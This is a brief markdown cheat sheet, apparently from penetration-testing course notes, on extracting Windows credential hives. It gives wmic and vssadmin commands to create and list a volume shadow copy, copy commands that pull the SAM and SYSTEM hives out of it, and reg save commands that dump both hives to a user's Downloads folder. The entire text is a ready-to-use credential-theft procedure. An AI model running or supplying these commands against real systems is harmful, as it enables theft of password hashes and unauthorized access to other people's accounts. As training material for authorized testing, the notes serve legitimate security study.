# Create shadowcopy
```
wmic shadowcopy all create Volume='C:\'
vssadmin list shadows
```
# Copy files
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system
```
## Or
```
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```
